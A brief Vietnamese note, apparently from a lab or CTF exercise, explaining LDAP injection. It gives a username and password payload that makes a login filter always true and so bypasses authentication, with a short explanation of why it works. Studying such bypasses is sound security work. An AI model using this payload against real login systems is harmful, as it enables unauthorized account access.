thử nhập vào một số kí tự nhạy cảm như (&) ta thu được query:
(&(uid=input)(userPassword=input))

nhập liệu để query trên luôn đúng:
username =*)(|(&
pass = *)
=>
(&(uid=*)(|(&)(userinput=[tùy ý..)]))

giải thích: uid = * => luôn đúng
                 (&) luôn đúng
